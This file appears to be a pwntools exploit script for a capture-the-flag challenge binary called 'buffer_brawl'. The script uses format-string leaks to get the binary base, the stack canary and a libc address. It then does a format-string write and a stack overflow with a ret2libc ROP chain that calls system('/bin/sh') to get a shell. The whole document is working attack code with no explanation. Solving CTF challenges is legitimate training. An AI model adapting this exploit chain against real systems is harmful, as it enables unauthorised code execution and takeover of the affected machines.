#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./buffer_brawl_patched')
libc = ELF('./libc6_2.35-0ubuntu3.8_amd64.so')
p = process()
#p = remote('buffer-brawl.chal.wwctf.com',1337)
#gdb.attach(p,gdbscript='''
#           b*slip+51
#           brva 0x00000000000013F8
#           brva 0x0000000000001464
#           ''')

target = 0x0000000000004010

p.sendlineafter(b'> ',b'4')

p.send('%13$p|%27$p|')

p.recvuntil(b'left?')
p.recvline()
exe_leak = int(p.recvuntil(b'|')[:-1],16)
canary = int(p.recvuntil(b'|')[:-1],16)

log.info(f"exe leak {hex(exe_leak)}")
log.info(f"canary: {hex(canary)}")
exe.address = exe_leak - 0x1747
log.info(f"exe = {hex(exe.address)}")

p.sendlineafter(b'> ',b'4')
payload = b'%7$saaaa'
payload += p64(exe.got.puts)

p.send(payload)
p.recvuntil(b'Right or left?')
p.recvline()
leak_libc = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak_libc - libc.sym.puts

log.info(f"leak libc {hex(leak_libc)}")
log.info(f"leak libc: {hex(libc.address)}")
pop_rdi = 0x000000000002a3e5 + libc.address
p.sendlineafter(b'> ',b'4')
p.send(b'%16c%8$hhnaaaaaa' + p64(target + exe.address))
input()
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'Enter your move: ',b'a'*24 + p64(canary) + p64(0) + p64(pop_rdi) + p64(next(libc.search('/bin/sh\x00')))+ p64(pop_rdi+1) + p64(libc.sym.system))
 


p.interactive()
